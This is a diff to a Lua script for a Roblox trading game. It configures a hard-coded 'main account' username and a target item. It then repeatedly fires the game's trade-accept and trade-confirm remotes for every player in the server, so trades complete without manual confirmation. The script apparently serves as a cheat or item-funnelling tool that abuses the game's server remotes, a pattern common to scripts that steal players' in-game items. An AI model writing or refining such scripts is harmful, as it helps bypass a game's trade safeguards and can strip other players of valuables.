@@ -1,10 +1,14 @@
--- 1Services
+-- Services
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-
-targetFrameNames = {"Dialog"}
+-- Configuration
+local MainAccUsername = {"Her0eXBuildera31"}
+local TARGET_ITEM_NAME = "Retired Egg"
+local TARGET_ITEM_FORM = "NORMAL"
+local ForceReceiver = false
+local targetFrameNames = {"Dialog"}
 
 -- Remotes / modules
 local API = ReplicatedStorage:WaitForChild("API")
@@ -213,6 +217,11 @@ task.spawn(function()
     end
 
     local function acceptTradeForAll()
+        local forceReceiverAcceptNegotiation =
+            API:WaitForChild("TradeAPI/AcceptNegotiation")
+        local forceReceiverConfirmTrade =
+            API:WaitForChild("TradeAPI/ConfirmTrade")
+
         for _, targetPlayer in ipairs(Players:GetPlayers()) do
             if targetPlayer ~= LocalPlayer then
 
@@ -221,6 +230,16 @@ task.spawn(function()
                         targetPlayer,
                         true
                     )
+                end)
+
+                pcall(function()
+                    forceReceiverAcceptNegotiation:FireServer()
+                end)
+
+                task.wait(0.5)
+
+                pcall(function()
+                    forceReceiverConfirmTrade:FireServer()
                 end)
             end
         end
@@ -373,10 +392,6 @@ task.spawn(function()
         return true
     end
 
-    --------------------------------------------------
-    -- OUTGOING TRADE LOOP
-    --------------------------------------------------
-
     task.spawn(function()
         local currentTargetIndex = 1
 
@@ -408,42 +423,12 @@ task.spawn(function()
                 end
             end
 
-            task.wait(0.5)
-        end
-    end)
-
-    --------------------------------------------------
-    -- FORCE RECEIVER
-    --------------------------------------------------
-
-    task.spawn(function()
-        local ForceAcceptNeg =
-            API:WaitForChild("TradeAPI/AcceptNegotiation")
-
-        local ForceConfirmTrade =
-            API:WaitForChild("TradeAPI/ConfirmTrade")
-
-        while true do
             if ForceReceiver then
                 acceptTradeForAll()
-
-                task.wait(1)
-
-                pcall(function()
-                    ForceAcceptNeg:FireServer()
-                end)
-
-                task.wait(0.5)
-
-                pcall(function()
-                    ForceConfirmTrade:FireServer()
-                end)
-
-                -- Cooldown prevents remote spam.
-                task.wait(4)
-            else
-                task.wait(1)
             end
+
+            -- Small gap before starting the next cycle.
+            task.wait(0.5)
         end
     end)
 
